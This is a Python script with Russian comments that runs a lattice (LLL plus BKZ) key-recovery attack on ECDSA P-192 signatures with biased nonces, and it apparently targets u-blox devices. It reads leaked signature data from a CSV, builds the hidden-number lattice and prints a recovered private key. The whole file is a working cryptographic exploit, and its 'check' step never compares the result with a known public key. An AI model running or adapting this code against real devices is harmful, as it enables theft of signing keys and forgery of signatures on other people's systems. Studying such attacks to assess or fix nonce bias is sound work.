#!/usr/bin/env python3
"""
БЫСТРАЯ LATTICE ATTACK (SNIPER MODE)
Использует только самые лучшие подписи с максимальной утечкой.
"""

import csv
import sys
import argparse
from ecdsa.curves import NIST192p

# Параметры (под регулируемую BKZ-атаку)
CURVE = NIST192p
ORDER = CURVE.order
PATH_DEFAULT = 'sigs_new.csv'
# Кол-во самых «утеченных» подписей в базе
BASIS_SIZE_DEFAULT = 80
# Размер блока BKZ (30-35 разумно)
BKZ_BLOCK_DEFAULT = 32

def inverse_mod(a, m):
    return pow(a, -1, m)

def solve_lattice(sigs, bkz_block):
    print(f"Запуск LLL+BKZ на {len(sigs)} лучших подписях (block={bkz_block})...")
    
    # Импортируем fpylll здесь, чтобы не падать если нет
    try:
        from fpylll import IntegerMatrix, LLL, BKZ
    except ImportError:
        print("Нужна библиотека fpylll! (pip install fpylll)")
        return None

    n = ORDER
    m = len(sigs)
    
    # Оценка Bias: берем минимальный r_bits → максимально возможный k < 2^{r_bits}
    min_rbits = min(s['r_bits'] for s in sigs)
    B = 2**min_rbits
    print(f"Используем Bound B = 2^{min_rbits}")

    # Матрица
    M = IntegerMatrix(m + 2, m + 2)
    
    t = []
    u = []
    for s in sigs:
        s_inv = inverse_mod(s['s'], n)
        t.append((s_inv * s['r']) % n)
        u.append((s_inv * s['z']) % n)

    for i in range(m):
        M[i, i] = B * n
        M[m, i] = t[i] * B
        M[m+1, i] = u[i] * B
        
    M[m, m] = 1
    M[m+1, m+1] = B
    
    # LLL
    print("LLL Reduction...")
    LLL.reduction(M)
    
    # BKZ для более глубокой редукции
    print(f"BKZ Reduction (block={bkz_block})...")
    BKZ.reduction(M, BKZ.Param(block_size=bkz_block))
    
    # Поиск решения
    for i in range(M.nrows):
        row = M[i]
        # Проверяем последний элемент ~ B
        if abs(abs(row[m+1]) - B) > B*0.1:
            continue
            
        d_cand = row[m]
        if row[m+1] < 0: d_cand = -d_cand
        d_cand %= n
        
        if d_cand > 0 and d_cand < n:
            print(f"\nКандидат найден! d = {hex(d_cand)}")
            # Проверка
            G = CURVE.generator
            Pub = d_cand * G
            print(f"Pub: {hex(Pub.x())}, {hex(Pub.y())}")
            return d_cand
            
    print("Решение не найдено в этом наборе.")
    return None

def main():
    parser = argparse.ArgumentParser(description="BKZ lattice attack on biased ECDSA nonces (u-blox)")
    parser.add_argument("--csv", default=PATH_DEFAULT, help="CSV with r,s,z,r_bits (default sigs_new.csv)")
    parser.add_argument("--top", type=int, default=BASIS_SIZE_DEFAULT, help="How many best signatures to use")
    parser.add_argument("--bkz", type=int, default=BKZ_BLOCK_DEFAULT, help="BKZ block size (30-35 recommended)")
    args = parser.parse_args()

    sigs = []
    with open(args.csv, 'r') as f:
        reader = csv.DictReader(f)
        for row in reader:
            sigs.append({
                'r': int(row['r']),
                's': int(row['s']),
                'z': int(row['z']),
                'r_bits': int(row['r_bits'])
            })
            
    # Сортировка по утечке (чем меньше r_bits, тем лучше)
    sigs.sort(key=lambda x: x['r_bits'])
    
    best_sigs = sigs[:args.top]
    print(f"Выбрано {len(best_sigs)} подписей. Диапазон битов: {best_sigs[0]['r_bits']} - {best_sigs[-1]['r_bits']}")
    
    solve_lattice(best_sigs, args.bkz)

if __name__ == "__main__":
    main()
